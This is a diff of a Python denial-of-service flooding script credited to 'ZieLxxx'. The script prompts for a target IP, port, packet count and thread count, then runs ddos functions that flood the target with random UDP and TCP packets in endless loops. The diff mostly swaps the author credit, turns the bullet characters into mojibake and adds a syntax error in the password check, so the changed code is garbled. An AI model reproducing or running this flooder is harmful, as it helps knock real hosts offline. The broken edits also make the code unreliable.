@@ -1,4 +1,4 @@
-#decode by ryhs
+#decode by ZieLxxx
 import random
 import socket
 import threading
@@ -11,15 +11,15 @@ os.system("clear")
 password ="ZIELXXX"
 
 for i in range(3):
-	pwd = input("[•] PASSWORD: ")
+	pwd=input("[â€¢] PASSWORD: ")
 	j=3
-	if(pwd==password):
+	if(pwd=password):
 		time.sleep(5)
-		print("[•] WAIT 5 SECONDS!!! ")
+		print("[â€¢] WAIT 5 SECONDS!!! ")
 		break
 	else:
 		time.sleep(5)
-		print("[×] PASSWORD SALAH!!! ")
+		print("[Ã—] PASSWORD SALAH!!! ")
 		continue
 time.sleep(5)
 print("{} Your Account Ha Been Accepted! \033[92mZIELXXX\033[0m ")
@@ -51,15 +51,15 @@ print(""
 >> Author : ZieLxxx
 >>> Coded : ZieLxxx
 >>>> Discord Comunity : https://discord.gg/exopus""")
-ip = str(input("[•] IP TARGET : "))
-port = int(input("[•] PORT : "))
-choice = str(input("[•] GAS MANISZZ? (ddos/n) : "))
-times = int(input("[•] PAKET : "))
-threads = int(input("[•] THREADS : "))
+ip = str(input("[â€¢] IP TARGET : "))
+port = int(input("[â€¢] PORT : "))
+choice = str(input("[â€¢] GAS MANISZZ? (ddos/n) : "))
+times = int(input("[â€¢] PAKET : "))
+threads = int(input("[â€¢] THREADS : "))
 os.system("clear")
 def ddos():
 	data = random._urandom(1024)
-	i = random.choice(("[•]","[•]","[•]"))
+	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -72,7 +72,7 @@ def ddos():
 
 def ddos2():
 	data = random._urandom(1025)
-	i = random.choice(("[•]","[•]","[•]"))
+	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -87,7 +87,7 @@ def ddos2():
 
 def ddos3():
 	data = random._urandom(1025)
-	i = random.choice(("[•]","[•]","[•]"))
+	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
